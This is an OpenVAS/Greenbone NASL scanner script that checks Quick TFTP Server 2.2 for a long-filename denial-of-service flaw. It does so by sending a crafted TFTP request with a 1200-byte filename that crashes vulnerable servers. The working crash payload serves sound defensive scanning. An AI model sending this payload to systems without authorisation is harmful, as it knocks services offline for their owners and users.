# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803714");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2013-06-10 18:00:09 +0530 (Mon, 10 Jun 2013)");
  script_name("Quick TFTP Server Long Filename Denial Of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("tftpd_detect.nasl", "global_settings.nasl", "os_detection.nasl");
  script_require_udp_ports("Services/udp/tftp", 69);
  script_mandatory_keys("tftp/detected");
  script_require_keys("Host/runs_windows");
  script_exclude_keys("keys/TARGET_IS_IPV6");

  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/quick-tftp-22-denial-of-service");
  script_xref(name:"URL", value:"http://www.iodigitalsec.com/blog/fuzz-to-denial-of-service-quick-tftp-server-2-2");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to cause denial
  of service attacks.");

  script_tag(name:"affected", value:"Quick TFTP Server version 2.2.");

  script_tag(name:"insight", value:"The flaw is due to an error when handling a long file name
  read request, which can be exploited by remote unauthenticated attackers to
  crash an affected application.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
  upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Quick TFTP Server is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

if(TARGET_IS_IPV6())
  exit(0);

include("tftp.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = service_get_port(default:69, proto:"tftp", ipproto:"udp");

if(!tftp_alive(port:port))
  exit(0);

soc = open_sock_udp(port);
if(!soc)
  exit(0);

attack = raw_string(0x00, 0x02, 0x66, 0x69, 0x6c, 0x65, 0x2e, 0x74, 0x78,
                    0x74, 0x0 ) + raw_string(crap(data:raw_string(0x41),
                    length: 1200)) + raw_string(0x00);
send(socket:soc, data:attack);
close(soc);

if(!tftp_alive(port:port)) {
  security_message(port:port, proto:"udp");
  exit(0);
}

exit(99);
